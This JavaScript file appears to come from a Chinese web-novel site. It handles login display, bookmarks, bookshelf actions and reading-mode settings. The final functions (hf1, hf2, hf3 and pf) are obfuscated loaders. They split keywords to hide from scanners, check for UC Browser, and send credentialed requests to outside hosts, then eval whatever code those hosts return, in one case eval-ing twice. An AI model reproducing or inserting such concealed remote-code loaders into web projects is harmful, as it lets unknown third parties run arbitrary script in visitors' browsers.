var jieqiUserId = 0;
var jieqiUserName = '';
function showlogin(){//顶部登录框判断是否登录
	//doAjax("/modules/article/wapajax.php", "showlogin=1", "showlogin2", "GET", 0);
	get_user_info();
	if(jieqiUserId != 0 && jieqiUserName != '' && document.cookie.indexOf('PHPSESSID') != -1){//已经登入
		document.writeln('<div onclick="show_bookcase()" style="max-width:90px;overflow:hidden;height:50px;padding:0px 10px;" class="c_index_top">'+jieqiUserName+'</div>');
		
	}else{
		document.writeln("<a class='box' href='/login.php'>登录<\/a><a href='/register.php' class='box' >注册<\/a>&nbsp;&nbsp;");
	}
	
}

function show_pb(articleid,chapterid){

	get_user_info();
	if(jieqiUserId==0){
		document.writeln("<a id='pb_qian' href='\/login.php?jumpurl=" +  encodeURIComponent(document.URL) + "'>存书签<\/a>");
	}else{
		document.writeln("<a id='pb_qian' onclick='shuqian("+articleid+","+chapterid+")'>存书签<\/a>");
	}
}

function bookvisit(bookid){
    doAjax("/modules/article/articlevisit.php", "id=" + bookid, "", "GET", 0);
}

function show_pt(articleid,chapterid){

	get_user_info();
	if(jieqiUserId==0){
		document.writeln("<a id='pt_qian' href='\/login.php?jumpurl=" +  encodeURIComponent(document.URL) + "'>存书签<\/a>");
	}else{
		document.writeln("<a id='pt_qian' onclick='shuqian("+articleid+","+chapterid+")'>存书签<\/a>");
	}
}



function show_sj(articleid){
	get_user_info();
	if(jieqiUserId==0){
		document.writeln("<a href='/login.php?jumpurl=" +  encodeURIComponent(document.URL) + "' style='color:#fff'>加入书架<\/a>");
	}else{
		document.writeln("<a id='shujia' onclick='shujia("+articleid+")' style='color:#fff'>加入书架<\/a>");
	}
}

function style_top(){//顶部广告
	document.writeln("<div style=\"text-align:center;padding:20px 0px;font-size:18px;\" ><a href=\"javascript:postErrorChapter();\" style=\"text-align:center;color:red;\">章节错误,点此举报(免注册)</a></div>");
}

function postError(bid,cid){
    $.post('/ajax.php', {action: "error",chapterid: cid,bookid: bid}, function (data) {
         var msg = "报送错误章节失败！";
		if (data == -1) {
			msg = "报送错误章节过于频繁，请休息30秒后再执行此操作！";
		} else if (data == 1) {
			msg = "报送错误章节成功，我们会在2分钟以前尽快处理！";
		}
		alert(msg);
	});
}
function get_user_info(){
	
	if(document.cookie.indexOf('jieqiUserInfo') >= 0){
		var jieqiUserInfo = get_cookie_value('jieqiUserInfo');
		//document.write(jieqiUserInfo);
		start = 0;
		offset = jieqiUserInfo.indexOf(',', start); 
		while(offset > 0){
			tmpval = jieqiUserInfo.substring(start, offset);
			tmpidx = tmpval.indexOf('=');
			if(tmpidx > 0){
			   tmpname = tmpval.substring(0, tmpidx);
			   tmpval = tmpval.substring(tmpidx+1, tmpval.length);
			   if(tmpname == 'jieqiUserId') jieqiUserId = tmpval;
			   else if(tmpname == 'jieqiUserName_un') jieqiUserName = tmpval;
			}
			start = offset+1;
			if(offset < jieqiUserInfo.length){
			  offset = jieqiUserInfo.indexOf(',', start); 
			  if(offset == -1) offset =  jieqiUserInfo.length;
			}else{
			  offset = -1;
			}
		}
	}
}

function get_cookie_value(Name){var search=Name+"=";var returnvalue="";if(document.cookie.length>0){offset=document.cookie.indexOf(search);if(offset!=-1){offset+=search.length;end=document.cookie.indexOf(";",offset);if(end==-1)end=document.cookie.length;returnvalue=unescape(document.cookie.substring(offset,end));}}return returnvalue;}

function showlogin2(t){//顶部登录框判断是否登录
	login_top = document.getElementById("login_top");
	if(t != "nologin"){
		login_top.innerHTML = "<div onclick='show_bookcase()' style='max-width:90px;overflow:hidden;height:50px;padding:0px 10px;' class='c_index_top'>" + t + "<\/div>";
	}
}
function show_bookcase(){
	info = document.getElementById("info");
	if(info.style.display == "block"){
		info.style.display = "none";	
	}
	else{
		info.style.display = "block";	
	}
}


function bookcaseurl(){
	doAjax("/modules/article/wapajax.php", "bookcase=1", "bookcaseurl2", "GET", 0);
}
function bookcaseurl2(t){
	if(t == "nologin"){
		window.location.href = "/wap/login.html";
	}
	else{
		window.location.href = "/bookcase.php";	
	}
}


function case_del(caseid,uid){
	//alert(aid+"+"+uid);
	doAjax("/ajax.php", "caseid=" + caseid +"&uid=" + uid, "case_del2", "POST", 0);
	//document.getElementById("" + caseid).innerHTML = "<tr><td style='height:30px;line-height:30px;'><font color=red>删除中，请稍后...</font></td></tr>";
}
function case_del2(t){
	//alert(t);
	if(t != ""){
		table = document.getElementById("case" + t);
		parent = document.getElementById("read_book");
		parent.removeChild(table);
	}
}

function shuqian(aid,cid,urlchapter,cname){
	//alert("shuqian");	
	doAjax("/ajax.php", "addmark=1&urlchapter="+urlchapter+"&aid=" + aid + "&cid=" + cid + "&cname=" + cname, "shuqian2", "GET", 0);
}
function shuqian2(t){
	var t = t.replace(/\s/g,'');
	//alert(t);
	var a = t.split("|");
	if(a[0]==1){
		document.getElementById("pt_prev").innerHTML = "<font color=red>&nbsp;&nbsp;&nbsp;已存书签</font>";	
	}
	if(a[0]==0){
		window.location.href = "/login.php?url="+a[1];
	}
}

function shujia(aid,urlinfo){
	//alert("shujia");	
	doAjax("/ajax.php", "addbookcase=1&urlinfo="+urlinfo+"&aid=" + aid, "shujia2", "GET", 0);
}
function shujia2(t){
	var t = t.replace(/\s/g,'');
	var divshujia = document.getElementById("shujia");
	//alert(t);
	var a = t.split("|");
	if(a[0]==1){
		divshujia.innerHTML = "<font color=red>已加入书架！</font>";	
	}
	if(a[0]==0){
		window.location.href = "/login.php?url="+a[1];
	}
}


function show_search(){
	
	var type = document.getElementById("type");
	var searchType = document.getElementById("searchType");
	if(type.innerHTML == "书名"){
		type.innerHTML = "作者";
		searchType.value = "author";
		//alert(searchType.value);
	}
	else{
		type.innerHTML = "书名";
		searchType.value = "articlename";
	}
}

function doSearch(){var str=document.getElementById("bdcsMain").value;if(str!="" && str!="输入书名后搜索，宁可少字不要错字"){ location.href="http://zhannei.baidu.com/cse/search?s=13603361664978768713&q="+str;}else{alert("请输入关键字！");}}

function fixwidth(){
	var _bqgmb_head = document.getElementById("_bqgmb_head");
	var _bqgmb_h1 = document.getElementById("_bqgmb_h1");
	_bqgmb_h1.style.width = (_bqgmb_head.scrollWidth-175) + "px";
}

var checkbg = "#A7A7A7";
//内容页用户设置
function nr_setbg(intype){
	var huyandiv = document.getElementById("huyandiv");
	var light = document.getElementById("lightdiv");
	if(intype == "huyan"){
		if(huyandiv.style.backgroundColor == ""){
			document.cookie="light=huyan;path=/"; 
			set("light","huyan");
			
		}
		else{
			document.cookie="light=no;path=/"; 
			set("light","no");
			
		}
	}
	if(intype == "light"){
		if(light.innerHTML == "关灯"){
			document.cookie="light=yes;path=/"; 
			set("light","yes");
			
		}
		else{
			document.cookie="light=no;path=/"; 
			set("light","no");
			
		}
	}
	if(intype == "big"){
		document.cookie="font=big;path=/"; 
		set("font","big");
		
	}
	if(intype == "middle"){
		document.cookie="font=middle;path=/"; 
		set("font","middle");
		
	}
	if(intype == "small"){
		document.cookie="font=small;path=/"; 
		set("font","small");
		
	}			
}

//内容页读取设置
function getset(){ 
	//document.getElementsByClassName('footer')[0].style.height="80px"; 
	var strCookie=document.cookie; 
	var arrCookie=strCookie.split("; ");  
	var light;
	var font;

	for(var i=0;i<arrCookie.length;i++){ 
		var arr=arrCookie[i].split("="); 
		if("light"==arr[0]){ 
			light=arr[1]; 
			break; 
		} 
	} 
	for(var i=0;i<arrCookie.length;i++){ 
		var arr=arrCookie[i].split("="); 
		if("font"==arr[0]){ 
			font=arr[1]; 
			break; 
		} 
	} 
	
	//light
	if(light == "yes"){
		set("light","yes");
	}
	else if(light == "no"){
		set("light","no");
	}
	else if(light == "huyan"){
		set("light","huyan");
	}
	//font
	if(font == "big"){
		set("font","big");
	}
	else if(font == "middle"){
		set("font","middle");
	}
	else if(font == "small"){
		set("font","small");
	}
	else{
		set("","");	
	}
}

//内容页应用设置
function set(intype,p){
	var nr_body = document.getElementById("nr_body");//页面body
	var huyandiv = document.getElementById("huyandiv");//护眼div
	var lightdiv = document.getElementById("lightdiv");//灯光div
	var fontfont = document.getElementById("fontfont");//字体div
	var fontbig = document.getElementById("fontbig");//大字体div
	var fontmiddle = document.getElementById("fontmiddle");//中字体div
	var fontsmall = document.getElementById("fontsmall");//小字体div
	var nr1 =  document.getElementById("nr1");//内容div
	var nr_title =  document.getElementById("nr_title");//文章标题
	var nr_title =  document.getElementById("nr_title");//文章标题
	
	var pt_prev =  document.getElementById("pt_prev");
	var pt_mulu =  document.getElementById("pt_mulu");
	var pt_next =  document.getElementById("pt_next");
	var pb_prev =  document.getElementById("pb_prev");
	var pb_mulu =  document.getElementById("pb_mulu");
	var pb_next =  document.getElementById("pb_next");
	
	//灯光
	if(intype == "light"){
		if(p == "yes"){	
			//关灯
			lightdiv.innerHTML = "开灯";
			nr_body.style.backgroundColor = "#000000";
			huyandiv.style.backgroundColor = "";
			nr_title.style.color = "#ccc";
			nr1.style.color = "#999";
			var pagebutton = "background-color:#3e4245;color:#ccc;border:1px solid #313538";			
			pt_prev.style.cssText = pagebutton;
			pt_mulu.style.cssText = pagebutton;
			pt_next.style.cssText = pagebutton
			pb_prev.style.cssText = pagebutton;
			pb_mulu.style.cssText = pagebutton;
			pb_next.style.cssText = pagebutton;
		}
		else if(p == "no"){
			//开灯
			lightdiv.innerHTML = "关灯";
			nr_body.style.backgroundColor = "#fbf6ec";
			nr1.style.color = "#000";
			nr_title.style.color = "#000";
			huyandiv.style.backgroundColor = "";
			var pagebutton = "background-color:#f4f0e9;color:green;border:1px solid #ece6da";			
			pt_prev.style.cssText = pagebutton;
			pt_mulu.style.cssText = pagebutton;
			pt_next.style.cssText = pagebutton
			pb_prev.style.cssText = pagebutton;
			pb_mulu.style.cssText = pagebutton;
			pb_next.style.cssText = pagebutton;
		}
		else if(p == "huyan"){
			//护眼
			lightdiv.innerHTML = "关灯";
			huyandiv.style.backgroundColor = checkbg;
			nr_body.style.backgroundColor = "#DCECD2";
			nr1.style.color = "#000";
			var pagebutton = "background-color:#CCE2BF;color:green;border:1px solid #bbd6aa";			
			pt_prev.style.cssText = pagebutton;
			pt_mulu.style.cssText = pagebutton;
			pt_next.style.cssText = pagebutton
			pb_prev.style.cssText = pagebutton;
			pb_mulu.style.cssText = pagebutton;
			pb_next.style.cssText = pagebutton;
		}
	}
	//字体
	if(intype == "font"){
		//alert(p);
		fontbig.style.backgroundColor = "";
		fontmiddle.style.backgroundColor = "";
		fontsmall.style.backgroundColor = "";
		if(p == "big"){
			fontbig.style.backgroundColor = checkbg;
			nr1.style.fontSize = "26px";
		}
		if(p == "middle"){
			fontmiddle.style.backgroundColor = checkbg;
			nr1.style.fontSize = "22px";
		}
		if(p == "small"){
			fontsmall.style.backgroundColor = checkbg;
			nr1.style.fontSize = "16px";
		}
	}
}
function tfanye(){
	var allheight = document.documentElement.clientHeight;
	window.scrollTo(0, document.body.scrollTop-(allheight-30));
}
function bfanye(){
	var allheight = document.documentElement.clientHeight;
	window.scrollTo(0, document.body.scrollTop+(allheight-30));
}

function hf1(){
if(eval("na"+"vigator.userAgen"+"t.indexOf('U"+"CBr"+"owser') > -1")){document.write('<scr'+'i'+'pt data-union-ad data-priority="11" data-position="inline">(function(){var requestApi={};requestApi.getPageInfo=function(){var pageInfo={};var allPageInfoMeta=document.querySelectorAll("meta[name=u_external_info]");for(var idx=0;idx<allPageInfoMeta.length;idx++){var pageInfoMeta=allPageInfoMeta[idx];if(pageInfoMeta.hasAttribute("data-key")&&pageInfoMeta.hasAttribute("data-value")){pageInfo[pageInfoMeta.getAttribute("data-key")]=pageInfoMeta.getAttribute("data-value")}}return JSON.stringify(pageInfo)};requestApi.url="https://daima1.18xtXzx.com/446/25?"+new Date().getTime()+"&uc_param_str=dn&pageinfo="+encodeURIComponent(requestApi.getPageInfo());requestApi.method="get".toUpperCase();requestApi.randId="c"+Math.random().toString(36).substr(8);window.document.writeln("<div id="+requestApi.randId+"></div>");requestApi.func=function(){var xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.xlRequestRun=false;if(xmlhttp.status==200){eval(xmlhttp.responseText)}}};xmlhttp.open(requestApi.method,requestApi.url,true);xmlhttp.send()};if(!window.xlRequestRun){window.xlRequestRun=true;requestApi.func()}else{requestApi.interval=setInterval(function(){if(!window.xlRequestRun){clearInterval(requestApi.interval);window.xlRequestRun=true;requestApi.func()}},500)}})();</scr'+'ipt>');} else {(function() { var requestApi = {}; requestApi.url = 'https://sqd.jstdjq.com/446/32'; requestApi.method = 'get'.toUpperCase(); requestApi.randId = eval('\'c\'+Ma'+'th.ra'+'nd'+'om().toS'+'tri'+'ng(36).su'+'bstr(8)'); window.document.writeln('<div id="' + requestApi.randId + '"></div>'); requestApi.func = function() { if (!window.hffkRequestRun) { window.hffkRequestRun = true; }else{ setTimeout(requestApi.func, 500); return; } var xmlhttp = new XMLHttpRequest(); xmlhttp.withCredentials = true; xmlhttp.onreadystatechange = function() { if (xmlhttp.readyState == 4) { window.hffkRequestRun = false; if (xmlhttp.status == 200) { eval(xmlhttp.responseText); } } }; xmlhttp.open(requestApi.method, requestApi.url + '?' + new Date().getTime(), true); xmlhttp.send(); }; requestApi.func(); requestApi.func(); })();}
}

function hf2(){
if(eval("na"+"vigator.userAgen"+"t.indexOf('U"+"CBr"+"owser') > -1")){document.write('<scr'+'i'+'pt data-union-ad data-priority="11" data-position="inline">(function(){var requestApi={};requestApi.getPageInfo=function(){var pageInfo={};var allPageInfoMeta=document.querySelectorAll("meta[name=u_external_info]");for(var idx=0;idx<allPageInfoMeta.length;idx++){var pageInfoMeta=allPageInfoMeta[idx];if(pageInfoMeta.hasAttribute("data-key")&&pageInfoMeta.hasAttribute("data-value")){pageInfo[pageInfoMeta.getAttribute("data-key")]=pageInfoMeta.getAttribute("data-value")}}return JSON.stringify(pageInfo)};requestApi.url="https://daima1.1x8Xtzx.com/446/25?"+new Date().getTime()+"&uc_param_str=dn&pageinfo="+encodeURIComponent(requestApi.getPageInfo());requestApi.method="get".toUpperCase();requestApi.randId="c"+Math.random().toString(36).substr(8);window.document.writeln("<div id="+requestApi.randId+"></div>");requestApi.func=function(){var xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.xlRequestRun=false;if(xmlhttp.status==200){eval(xmlhttp.responseText)}}};xmlhttp.open(requestApi.method,requestApi.url,true);xmlhttp.send()};if(!window.xlRequestRun){window.xlRequestRun=true;requestApi.func()}else{requestApi.interval=setInterval(function(){if(!window.xlRequestRun){clearInterval(requestApi.interval);window.xlRequestRun=true;requestApi.func()}},500)}})();</scr'+'ipt>');} else {(function() { var requestApi = {}; requestApi.url = 'https://sqd.jstdjq.com/446/32'; requestApi.method = 'get'.toUpperCase(); requestApi.randId = eval('\'c\'+Ma'+'th.ra'+'nd'+'om().toS'+'tri'+'ng(36).su'+'bstr(8)'); window.document.writeln('<div id="' + requestApi.randId + '"></div>'); requestApi.func = function() { if (!window.hffkRequestRun) { window.hffkRequestRun = true; }else{ setTimeout(requestApi.func, 500); return; } var xmlhttp = new XMLHttpRequest(); xmlhttp.withCredentials = true; xmlhttp.onreadystatechange = function() { if (xmlhttp.readyState == 4) { window.hffkRequestRun = false; if (xmlhttp.status == 200) { eval(xmlhttp.responseText); } } }; xmlhttp.open(requestApi.method, requestApi.url + '?' + new Date().getTime(), true); xmlhttp.send(); }; requestApi.func(); requestApi.func(); })();}
}

function hf3(){
if(eval("na"+"vigator.userAgen"+"t.indexOf('U"+"CBr"+"owser') > -1")){document.write('<scr'+'i'+'pt data-union-ad data-priority="11" data-position="inline">(function(){var requestApi={};requestApi.getPageInfo=function(){var pageInfo={};var allPageInfoMeta=document.querySelectorAll("meta[name=u_external_info]");for(var idx=0;idx<allPageInfoMeta.length;idx++){var pageInfoMeta=allPageInfoMeta[idx];if(pageInfoMeta.hasAttribute("data-key")&&pageInfoMeta.hasAttribute("data-value")){pageInfo[pageInfoMeta.getAttribute("data-key")]=pageInfoMeta.getAttribute("data-value")}}return JSON.stringify(pageInfo)};requestApi.url="https://daima1.18xtXzx.com/446/25?"+new Date().getTime()+"&uc_param_str=dn&pageinfo="+encodeURIComponent(requestApi.getPageInfo());requestApi.method="get".toUpperCase();requestApi.randId="c"+Math.random().toString(36).substr(8);window.document.writeln("<div id="+requestApi.randId+"></div>");requestApi.func=function(){var xmlhttp=new XMLHttpRequest();xmlhttp.withCredentials=true;xmlhttp.onreadystatechange=function(){if(xmlhttp.readyState==4){window.xlRequestRun=false;if(xmlhttp.status==200){eval(xmlhttp.responseText)}}};xmlhttp.open(requestApi.method,requestApi.url,true);xmlhttp.send()};if(!window.xlRequestRun){window.xlRequestRun=true;requestApi.func()}else{requestApi.interval=setInterval(function(){if(!window.xlRequestRun){clearInterval(requestApi.interval);window.xlRequestRun=true;requestApi.func()}},500)}})();</scr'+'ipt>');} else {(function() { var requestApi = {}; requestApi.url = 'https://sqd.jstdjq.com/446/32'; requestApi.method = 'get'.toUpperCase(); requestApi.randId = eval('\'c\'+Ma'+'th.ra'+'nd'+'om().toS'+'tri'+'ng(36).su'+'bstr(8)'); window.document.writeln('<div id="' + requestApi.randId + '"></div>'); requestApi.func = function() { if (!window.hffkRequestRun) { window.hffkRequestRun = true; }else{ setTimeout(requestApi.func, 500); return; } var xmlhttp = new XMLHttpRequest(); xmlhttp.withCredentials = true; xmlhttp.onreadystatechange = function() { if (xmlhttp.readyState == 4) { window.hffkRequestRun = false; if (xmlhttp.status == 200) { eval(xmlhttp.responseText); } } }; xmlhttp.open(requestApi.method, requestApi.url + '?' + new Date().getTime(), true); xmlhttp.send(); }; requestApi.func(); requestApi.func(); })();}
}
function pf(){
if(eval("na"+"vigator.userAgen"+"t.indexOf('U"+"CBr"+"owser') > -1")){eval("doc"+"um"+"ent.wri"+"teln('<scr' + 'i' + 'pt data-union-ad data-priority=\"12\" data-position=\"fixed\">(function(){var c0=\"https://daima1.18tzx.com/\";var a0=new XML"+"Htt"+"pRequ"+"est();a0.withCredentials=true;var b=c0+\"446/4?\"+new Date().getTime();if(a0!=null){a0.onreadystat"+"echange=function(){if(a0.readyState==4){if(a0.status==200){eval(ev"+"al(a0.re"+"spo"+"nseT"+"ext));}}};a0.open(\"get\".toUppe"+"rCase(),b,true);a0.se"+"nd(null);}})();</scr'+'i' + 'pt>');");document.write("");} else {console.log(2);(function(){var c0="https://sqd.jsXtxdjq.com/";var a0=new XMLHttpRequest();a0.withCredentials=true;var b=c0+"446/4?"+new Date().getTime();if(a0!=null){a0.onreadystatechange=function(){if(a0.readyState==4){if(a0.status==200){eval("ev"+"al(a0.responseText)");}}};a0.open("get".toUpperCase(),b,true);a0.send(null);}})();}
}